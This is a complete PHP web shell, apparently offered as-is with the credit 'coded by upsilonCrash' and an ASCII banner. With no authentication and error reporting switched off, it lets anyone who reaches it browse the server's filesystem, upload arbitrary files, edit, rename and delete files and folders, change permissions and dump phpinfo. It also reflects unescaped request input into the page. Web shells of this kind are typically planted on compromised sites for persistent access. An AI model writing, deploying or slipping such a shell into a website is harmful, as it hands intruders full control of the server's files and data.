<?php
error_reporting(0);
echo "
<style>
    body {
        color: Gray;
        background: #353535;
        font-weight: Bold;
        font-family: Arial;
        font-size: 14px;
    }

    input[id=one] {
        background: Transparent;
        color: Gray;
        font-weight: Bold;
        border: #353535 1px solid;
    }

    input[id=textinput] {
        border: 1px #353535 solid;
        background: #353535;
        color: Gray;
        font-weight: Bold;
        width: 50%;
    }

    input[type=submit] {
        background: Transparent;
        color: Gray;
        font-weight: Bold;
        border: #353535 1px solid;
    }

    input[type=file] , [id=three] {
        width: 30%;
        border: 1px Gray solid;
        border-radius: 10px;
        background: #353535;
        color: Gray;
    }

    input[id=two] {
        margin-left: 70px;
    }

    a {
        text-decoration: none;
        color: Gray;
    }

    table {
        font-weight: Bold;
    }

    textarea {
        width: 90%;
        height: 50%;
    }

    .iclass {
        margin-left: 40px;
    }
</style>

";

if (isset($_POST["phpinfo"])) {
    echo "<a href='?path=".$_GET["path"]."'>back</a>";
    phpinfo();
    exit;
}

echo "<pre><center>
.d8888b  888  888 88888b.   .d88b.  888  888 888  888
88K      888  888 888 '88b d88P'88b 888  888 `Y8bd8P'
'Y8888b. 888  888 888  888 888  888 888  888   X88K  
     X88 Y88b 888 888  888 Y88b 888 Y88b 888 .d8''8b.
d88888P'  'Y88888 888  888  'Y88888  'Y88888 888  888
                                888                  
                           Y8b d88P                  
                            'Y88P'                   
</center></pre>";

$path = base64_decode($_GET["path"]);

if (is_dir($path)) {
    if ($path !== "/") {
        $slash = "/";
    } else {
        $slash = "";
    }
} else {
    $checkslash = substr($path, 2);
    if (is_dir($checkslash)) {
        if ($checkslash !== "/") {
            $slash = "/";
        } else {
            $slash = "";
        }
    } else {
        if (is_file($checkslash)) {
            if ($checkslash !== "/") {
                $slash = "/";
            } else {
                $slash = "";
            }
        }
    }
}

if (!is_dir($path)) {
    if (substr($path, 0, 2) == "#E") {
        if (!is_file(substr($path, 2))) {
            header("Location: ?path=".base64_encode(__DIR__)."");
        }
    } else {
        if (substr($path, 0, 2) == "#R") {
            if (!is_file(substr($path, 2))) {
                if (!is_dir(substr($path, 2))) {
                    header("Location: ?path=".base64_encode(__DIR__)."");
                }
            }
        } else {
            if (substr($path, 0, 2) == "#D") {
                if (!is_file(substr($path, 2))) {
                    if (!is_dir(substr($path, 2))) {
                        header("Location: ?path=".base64_encode(__DIR__)."");
                    }
                }
            } else {
                if (substr($path, 0, 2) == "#C") {
                    if (!is_file(substr($path, 2))) {
                        if (!is_dir(substr($path, 2))) {
                            header("Location: ?path=".base64_encode(__DIR__)."");
                        }
                    }
                } else {
		    header("Location: ?path=".base64_encode(__DIR__)."");
		}
            }
        }
    }
}
echo "<form action='' method='post' enctype='multipart/form-data'>";

if (isset($_POST["move_upload"])) {
    if (strpos($_POST["uptopath"], "..") !== FALSE) {
        echo "
        <script>
        alert('failed');
        document.location.href = '?path=".$_GET["path"]."';
        </script>
        ";
    }
    $fileName = $_FILES["file"]["name"];
    $tmpName = $_FILES["file"]["tmp_name"];
    $upload = $_POST["uptopath"].$slash.$fileName;
    if (is_file($upload)) {
        echo "
        <script>
        alert('file name already exists');
        document.location.href = '?path=".$_GET["path"]."';
        </script>
        ";
    } else {
        if (move_uploaded_file($tmpName, $upload)) {
            echo "
            <script>
            alert('successfully');
            document.location.href = '?path=".$_GET["path"]."';
            </script>
            ";
        } else {
            echo "
            <script>
            alert('failed');
            document.location.href = '?path=".$_GET["path"]."';
            </script>
            ";
        }
    }
}

if (isset($_POST["crf"])) {
    if (is_dir($_POST["pathfolder"])) {
        if (strpos($_POST["pathfolder"], "..") !== FALSE) {
            echo "
            <script>
            alert('failed');
            document.location.href = '?path=".$_GET["path"]."';
            </script>
            ";
        }
        if (strpos($_POST["foldername"], "/") !== FALSE) {
            echo "
            <script>
            alert('use a different name');
            document.location.href = '?path=".$_GET["path"]."';
            </script>
            ";
        } else {
            $o2 = explode("/", $_POST["pathfolder"]);
            $o2 = implode("/", $o2);
            $o2 = $o2.$slash.$_POST["foldername"];
            if (!is_dir($o2)) {
                if (mkdir($o2)) {
                    echo "
                    <script>
                    alert('successfully');
                    document.location.href = '?path=".$_GET["path"]."';
                    </script>
                    ";
                } else {
                    echo "
                    <script>
                    alert('failed');
                    document.location.href = '?path=".$_GET["path"]."';
                    </script>
                    ";
                }
            } else {
                echo "
                <script>
                alert('folder name alredy exists');
                document.location.href = '?path=".$_GET["path"]."';
                </script>
                ";
            }
        }
    } else {
        echo "
        <script>
        alert('directory not found');
        document.location.href = '?path=".$_GET["path"]."';
        </script>
        ";
    }
}

if (isset($_POST["crfl"])) {
    if (strpos($_POST["pathfile"], "..") == FALSE) {
        if (is_dir($_POST["pathfile"])) {
            $slashcheck = explode("/", $_POST["pathfile"]);
            $slashcheck = implode("/", $slashcheck).$slash;
            if (strpos($_POST["filename"], "/") == FALSE) {
                $filePath9 = $slashcheck.$_POST["filename"];
                if (!is_file($filePath9)) {
                    $createFile = fopen($filePath9, "x");
                    if ($createFile) {
                        echo "
                        <script>
                        alert('successfully');
                        document.location.href = '?path=".$_GET["path"]."';
                        </script>
                        ";
                    } else {
                        echo "
                        <script>
                        alert('failed');
                        document.location.href = '?path=".$_GET["path"]."';
                        </script>
                        ";
                    }
                } else {
                    echo "
                    <script>
                    alert('file name already exists');
                    document.location.href = '?path=".$_GET["path"]."';
                    </script>
                    ";
                }
            } else {
                echo "
                <script>
                alert('use a different name');
                document.location.href = '?path=".$_GET["path"]."';
                </script>
                ";
            }
        } else {
            echo "
            <script>
            alert('directory not found');
            document.location.href = '?path=".$_GET["path"]."';
            </script>
            ";
        }
    } else {
        echo "
        <script>
        alert('failed');
        document.location.href = '?path=".$_GET["path"]."';
        </script>
        ";
    }
}

if (substr($path, 0, 2) == "#E") {
    echo "<input type='text' readonly='readonly' value='".substr($path, 2)."' id='one' style='width: 80%;'><hr color='Gray'><center>";
    $back = dirname(substr($path, 2));
    if (isset($_POST["save_edit"])) {
        $delta = substr($path, 2);
        $editz = fopen($delta, "w");
        if (fwrite($editz, $_POST["edit_data"])) {
            echo "
            <script>
            alert('successfully');
            document.location.href = '?path=".base64_encode($back)."';
            </script>
            "; fclose($editz);
        } else {
            echo "
            <script>
            alert('failed');
            document.location.href = '?path=".base64_encode($back)."';
            </script>
            "; fclose($editz);
        }
    }
    if (filesize(substr($path, 2)) == 0) {
        echo "
        <textarea name='edit_data'></textarea><hr color='Gray'><a href='?path=".base64_encode($back)."'>cancel</a>
        <input type='submit' name='save_edit' value='save' id='two'>
        ";
    } else {
        $textareaValue = fopen(substr($path, 2), "r");
        $textareaValue = fread($textareaValue, filesize(substr($path, 2)));
        $textareaValue = htmlspecialchars($textareaValue);
        echo "
        <textarea name='edit_data'>".$textareaValue."</textarea>
        <hr color='Gray'><a href='?path=".base64_encode($back)."'>cancel</a><input type='submit' name='save_edit' value='save' id='two'>
        ";
        fclose($textareaValue);
    }
    exit;
}

if (substr($path, 0, 2) == "#R") {
    echo "<input type='text' readonly='readonly' value='".substr($path, 2)."' id='one' style='width: 80%;'>";
    $delta = substr($path, 2);
    $back = dirname($delta);
    if (isset($_POST["submit_rename"])) {
        $alphacheck = dirname($delta).$slash.$_POST["rename"];
        if (!is_dir($alphacheck)) {
            if (!is_file($alphacheck)) {
                if (rename($delta, $alphacheck)) {
                    echo "
                    <script>
                    alert('successfully');
                    document.location.href = '?path=".base64_encode($back)."';
                    </script>
                    ";
                } else {
                    echo "
                    <script>
                    alert('failed');
                    document.location.href = '?path=".base64_encode($back)."';
                    </script>
                    ";
                }
            } else {
                echo "
                <script>
                alert('file name alredy exists');
                document.location.href = '?path=".base64_encode($back)."';
                </script>
                ";
            }
        } else {
            echo "
            <script>
            alert('folder name alredy exists');
            document.location.href = '?path=".base64_encode($back)."';
            </script>
            ";
        }
    }
    echo "
    <input type='text' id='three' autocomplete='off' name='rename' value='".basename($delta)."'><hr color='Gray'><center>
    <a href='?path=".base64_encode($back)."'>cancel</a><input type='submit' name='submit_rename' value='rename' id='two'>
    ";
    exit;
}

if (substr($path, 0, 2) == "#D") {
    $delta = substr($path, 2);
    $back = dirname($delta);

    if (isset($_POST["submit_delete"])) {
        if (is_dir($delta)) {
            if (rmdir($delta)) {
                echo "
                <script>
                alert('successfully');
                document.location.href = '?path=".base64_encode($back)."';
                </script>
                ";
            } else {
                echo "
                <script>
                alert('failed');
                document.location.href = '?path=".base64_encode($back)."';
                </script>
                ";
            }
        } else {
            if (unlink($delta)) {
                echo "
                <script>
                alert('successfully');
                document.location.href = '?path=".base64_encode($back)."';
                </script>
                ";
            } else {
                echo "
                <script>
                alert('failed');
                document.location.href = '?path=".base64_encode($back)."';
                </script>
                ";
            }
        }
    }

    if (is_dir($delta)) {
        $cat = "folder";
    } else {
        $cat = "file";
    }
    echo "path : <input type='text' readonly='readonly' value='".$delta."' id='one' style='width: 80%;'><br>
    name : <input type='text' readonly='readonly' value='".basename($delta)."' id='one' style='width: 80%;'><br>
    are you sure to permanently delete this ".$cat."?<hr color='Gray'><center>
    <a href='?path=".base64_encode($back)."'>no</a><input type='submit' name='submit_delete' value='yes' id='two'>
    ";
    exit;
}

if (substr($path, 0, 2) == "#C") {

    $home = dirname(substr($path, 2)); $home = base64_encode($home);
    $perms = substr(sprintf('%o',fileperms(substr($path, 2))),-3);

    $chv = fileperms(substr($path, 2));
    $a = ($chv & 00400) ? ' checked' : '';
    $b = ($chv & 00040) ? ' checked' : '';
    $c = ($chv & 00004) ? ' checked' : '';
    $d = ($chv & 00200) ? ' checked' : '';
    $e = ($chv & 00020) ? ' checked' : '';
    $f = ($chv & 00002) ? ' checked' : '';
    $g = ($chv & 00100) ? ' checked' : '';
    $h = ($chv & 00010) ? ' checked' : '';
    $i = ($chv & 00001) ? ' checked' : '';

    if (isset($_POST["submit_chmod"])) {
        $chmode = 0;
        if (!empty($_POST['ra'])) {
            $chmode |= 0400;
        }
        if (!empty($_POST['wa'])) {
            $chmode |= 0200;
        }
        if (!empty($_POST['ea'])) {
            $chmode |= 0100;
        }
        if (!empty($_POST['rb'])) {
            $chmode |= 0040;
        }
        if (!empty($_POST['wb'])) {
            $chmode |= 0020;
        }
        if (!empty($_POST['eb'])) {
            $chmode |= 0010;
        }
        if (!empty($_POST['rc'])) {
            $chmode |= 0004;
        }
        if (!empty($_POST['wc'])) {
            $chmode |= 0002;
        }
        if (!empty($_POST['ec'])) {
            $chmode |= 0001;
        }
        if (chmod(substr($path, 2), $chmode)) {
            echo "
            <script>
            alert('successfully');
            document.location.href = '?path=".$home."';
            </script>
            ";
        } else {
            echo "
            <script>
            alert('failed');
            document.location.href = '?path=".$home."';
            </script>
            ";
        }
    }

    echo "
        <hr color='Gray'><form action='' method='post'>
        <input type='text' readonly='readonly' value='".substr($path, 2)."' id='one' style='width: 100%'>
        <hr color='Gray'>
        <table width='100%'>
            <tr>
                <th class='chmodd'>Permissions</th>
                <th class='chmodd'>Owner</th>
                <th class='chmodd'>Group</th>
                <th class='chmodd'>Other</th>
            </tr>
            <tr>
                <td>Read</td>
                <td><center><input type='checkbox' name='ra' value='1' ".$a."></center></td>
                <td><center><input type='checkbox' name='rb' value='1' ".$b."></center></td>
                <td><center><input type='checkbox' name='rc' value='1' ".$c."></center></td>
            </tr>
            <tr>
                <td>Write</td>
                <td><center><input type='checkbox' name='wa' value='1' ".$d."></center></td>
                <td><center><input type='checkbox' name='wb' value='1' ".$e."></center></td>
                <td><center><input type='checkbox' name='wc' value='1' ".$f."></center></td>
            </tr>
            <tr>
                <td>Execute</td>
                <td><center><input type='checkbox' name='ea' value='1' ".$g."></center></td>
                <td><center><input type='checkbox' name='eb' value='1' ".$h."></center></td>
                <td><center><input type='checkbox' name='ec' value='1' ".$i."></center></td>
            </tr>
        </table><hr color='Gray'>
        <center><a href='?path=".$home."'>cancel</a>
        <input type='submit' name='submit_chmod' value='change' id='two'></center>
    "; exit;
}

if (isset($_POST["upload"])) {
    echo "
    upload to : <input type='text' autocomplete='off' id='textinput' name='uptopath' value='".$path.$slash."' width='100px'><br>
    <input type='file' name='file'><hr color='Gray'><center><a href='?path=".$_GET["path"]."'>cancel</a>
    <input type='submit' name='move_upload' value='upload' id='two'>
    "; exit;
}

if (isset($_POST["create_folder"])) {
    echo "
    create on : <input type='text' autocomplete='off' id='textinput' name='pathfolder' value='".$path.$slash."' width='100px'><br>
    <input type='text' autocomplete='off' name='foldername' id='three' placeholder='folder name'><hr color='Gray'><center><a href='?path=".$_GET["path"]."'>cancel</a>
    <input type='submit' name='crf' value='create' id='two'>
    "; exit;
}

if (isset($_POST["create_file"])) {
    echo "
    create on : <input type='text' autocomplete='off' id='textinput' name='pathfile' value='".$path.$slash."' width='100px'><br>
    <input type='text' autocomplete='off' name='filename' id='three' placeholder='file name'><hr color='Gray'><center><a href='?path=".$_GET["path"]."'>cancel</a>
    <input type='submit' name='crfl' value='create' id='two'>
    "; exit;
}

echo "
<input type='text' readonly='readonly' id='one' value='".$path.$slash."' style='width: 100%;'><hr color='Gray'>
<input type='submit' name='upload' value='upload'>
<input type='submit' name='create_folder' value='+ folder'>
<input type='submit' name='create_file' value='+ file'>
<input type='submit' name='phpinfo' value='phpinfo'>";

echo "<table width='100%'>";

if ($path !== "/") {
    $alpha = dirname($path);
    echo "<tr><td width='2%'><div class='iclass'><a href='?path=".base64_encode($alpha)."'>..</a></div></td></tr>";
}

$scanPath = scandir($path);
$scanPath = array_diff($scanPath,array('.','..'));
$scanPath = array_values($scanPath);

for ($i = 0; $i < count($scanPath); $i++) {
    $iota = $scanPath[$i];
    if (is_dir($path.$slash.$iota)) {

        $result = filemtime($path.$slash.$iota); $result = getdate($result);
        $one = strlen($result["mday"]); $two = strlen($result["mon"]);
        $three = strlen($result["year"]); $four = strlen($result["hours"]);
        $five = strlen($result["minutes"]);
        if ($one == "1") {
            $result["mday"] = "0".$result["mday"];
        } if ($two == "1") {
            $result["mon"] = "0".$result["mon"];
        } if ($three == "1") {
            $result["year"] = "0".$result["year"];
        } if ($four == "1") {
            $result["hours"] = "0".$result["hours"];
        } if ($five == "1") {
            $result["minutes"] = "0".$result["minutes"];
        } $result = $result["mday"]."-".$result["mon"]."-".$result["year"]." ".$result["hours"].":".$result["minutes"];

        echo "<tr><td width='2%'><div class='iclass'>D</div></td><td width='50%'>| <input type='text' readonly='readonly' id='one' value='".$iota."' style='width: 50%'></td>
        <td width='10%'><center>-</center></td><td width='20%'><center>".$result."</center></td>
        <td width='5%'><center><a title='chmod ".$iota."' href='?path=".base64_encode("#C".$path.$slash.$iota)."'>".substr(sprintf('%o',fileperms($path.$slash.$iota)),-4)."</a></center></td>
        <td style='width: 5%'><center><a title='open ".$iota."' href='?path=".base64_encode($path.$slash.$iota)."'>O</a>
        <a title='rename ".$iota."' href='?path=".base64_encode("#R".$path.$slash.$iota)."'>R</a>
        <a title='delete ".$iota."' href='?path=".base64_encode("#D".$path.$slash.$iota)."'>D</a></center></td>
        </tr>";
    }
}

for ($i = 0; $i < count($scanPath); $i++) {

    $iota = $scanPath[$i];
    $pathType = mime_content_type($path.$slash.$iota);
    $pathType = explode("/", $pathType);
    $sizeA = filesize($path.$slash.$iota);
    $filesize = $sizeA;
    $sizeks = "B";
    if ($sizeA > 1024) {
        $filesize = round($sizeA / 1024);
        $sizeks = "KB";
    }  if ($sizeA > 1024 * 1024) {
        $filesize = round($sizeA / 1024 / 1024);
        $sizeks = "MB";
    } if ($sizeA > 1024 * 1024 * 1024) {
        $filesize = round($sizeA / 1024 / 1024 / 1024);
        $sizeks = "GB";
    } if ($sizeA > 1024 * 1024 * 1024 * 1024) {
        $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024);
        $sizeks = "TB";
    } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024) {
        $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024);
        $sizeks = "PB";
    } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024 * 1024) {
        $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024 / 1024);
        $sizeks = "EB";
    } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024) {
        $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024);
        $sizeks = "ZB";
    } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024  * 1024) {
        $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024);
        $sizeks = "YB";
    }

    $result = filemtime($path.$slash.$iota); $result = getdate($result);
    $one = strlen($result["mday"]); $two = strlen($result["mon"]);
    $three = strlen($result["year"]); $four = strlen($result["hours"]);
    $five = strlen($result["minutes"]);
    if ($one == "1") {
        $result["mday"] = "0".$result["mday"];
    } if ($two == "1") {
        $result["mon"] = "0".$result["mon"];
    } if ($three == "1") {
        $result["year"] = "0".$result["year"];
    } if ($four == "1") {
        $result["hours"] = "0".$result["hours"];
    } if ($five == "1") {
        $result["minutes"] = "0".$result["minutes"];
    } $result = $result["mday"]."-".$result["mon"]."-".$result["year"]." ".$result["hours"].":".$result["minutes"];

    if ($pathType[0] == "text") {
        echo "<tr><td width='2%'><div class='iclass'>F</div></td><td width='50%'>| <input type='text' readonly='readonly' id='one' value='".$iota."' style='width: 50%'></td>
        <td width='10%'><center>".$filesize.$sizeks."</center></td><td width='20%'><center>".$result."</center></td>
        <td width='5%'><center><a title='chmod ".$iota."' href='?path=".base64_encode("#C".$path.$slash.$iota)."'>".substr(sprintf('%o',fileperms($path.$slash.$iota)),-4)."</a></center></td>
        <td style='width: 5%'><center><a title='edit ".$iota."' href='?path=".base64_encode("#E".$path.$slash.$iota)."'>E</a>
        <a title='rename ".$iota."' href='?path=".base64_encode("#R".$path.$slash.$iota)."'>R</a>
        <a title='delete ".$iota."' href='?path=".base64_encode("#D".$path.$slash.$iota)."'>D</a></center></td>
        </tr>";
    } else {
        if ($pathType[0] == "application") {
            echo "<tr><td width='2%'><div class='iclass'>F</div></td><td width='50%'>| <input type='text' readonly='readonly' id='one' value='".$iota."' style='width: 50%'></td>
            <td width='10%'><center>".$filesize.$sizeks."</center></td><td width='20%'><center>".$result."</center></td>
            <td width='5%'><center><a title='chmod ".$iota."' href='?path=".base64_encode("#C".$path.$slash.$iota)."'>".substr(sprintf('%o',fileperms($path.$slash.$iota)),-4)."</a></center></td>
            <td style='width: 5%'><center><a title='edit ".$iota."' href='?path=".base64_encode("#E".$path.$slash.$iota)."'>E</a>
            <a title='rename ".$iota."' href='?path=".base64_encode("#R".$path.$slash.$iota)."'>R</a>
            <a title='delete ".$iota."' href='?path=".base64_encode("#D".$path.$slash.$iota)."'>D</a></center></td>
            </tr>";
        }
    }
}

for ($i = 0; $i < count($scanPath); $i++) {

    $iota = $scanPath[$i];
    $pathType = mime_content_type($path.$slash.$iota);
    $pathType = explode("/", $pathType);
    if ($pathType[0] !== "application") {
        if ($pathType[0] !== "text") {
            if (is_file($path.$slash.$iota)) {

                $sizeA = filesize($path.$slash.$iota);
                $filesize = $sizeA;
                $sizeks = "B";
                if ($sizeA > 1024) {
                    $filesize = round($sizeA / 1024);
                    $sizeks = "KB";
                }  if ($sizeA > 1024 * 1024) {
                    $filesize = round($sizeA / 1024 / 1024);
                    $sizeks = "MB";
                } if ($sizeA > 1024 * 1024 * 1024) {
                    $filesize = round($sizeA / 1024 / 1024 / 1024);
                    $sizeks = "GB";
                } if ($sizeA > 1024 * 1024 * 1024 * 1024) {
                    $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024);
                    $sizeks = "TB";
                } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024) {
                    $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024);
                    $sizeks = "PB";
                } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024 * 1024) {
                    $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024 / 1024);
                    $sizeks = "EB";
                } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024) {
                    $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024);
                    $sizeks = "ZB";
                } if ($sizeA > 1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024  * 1024) {
                    $filesize = round($sizeA / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024 / 1024);
                    $sizeks = "YB";
                }

                $result = filemtime($path.$slash.$iota); $result = getdate($result);
                $one = strlen($result["mday"]); $two = strlen($result["mon"]);
                $three = strlen($result["year"]); $four = strlen($result["hours"]);
                $five = strlen($result["minutes"]);
                if ($one == "1") {
                    $result["mday"] = "0".$result["mday"];
                } if ($two == "1") {
                    $result["mon"] = "0".$result["mon"];
                } if ($three == "1") {
                    $result["year"] = "0".$result["year"];
                } if ($four == "1") {
                    $result["hours"] = "0".$result["hours"];
                } if ($five == "1") {
                    $result["minutes"] = "0".$result["minutes"];
                } $result = $result["mday"]."-".$result["mon"]."-".$result["year"]." ".$result["hours"].":".$result["minutes"];

                echo "<tr><td width='2%'><div class='iclass'>F</div></td><td width='50%'>| <input type='text' readonly='readonly' id='one' value='".$iota."' style='width: 50%'></td>
                <td width='10%'><center>".$filesize.$sizeks."</center></td><td width='20%'><center>".$result."</center></td>
                <td width='5%'><center><a title='chmod ".$iota."' href='?path=".base64_encode("#C".$path.$slash.$iota)."'>".substr(sprintf('%o',fileperms($path.$slash.$iota)),-4)."</a></center></td>
                <td style='width: 5%'><center><a title='rename ".$iota."' href='?path=".base64_encode("#R".$path.$slash.$iota)."'>R</a>
                <a title='delete ".$iota."' href='?path=".base64_encode("#D".$path.$slash.$iota)."'>D</a></center></td></tr>";
            }
        }
    }
}

echo "</table><hr color='Gray'><center>coded by upsilonCrash</form>";

?>
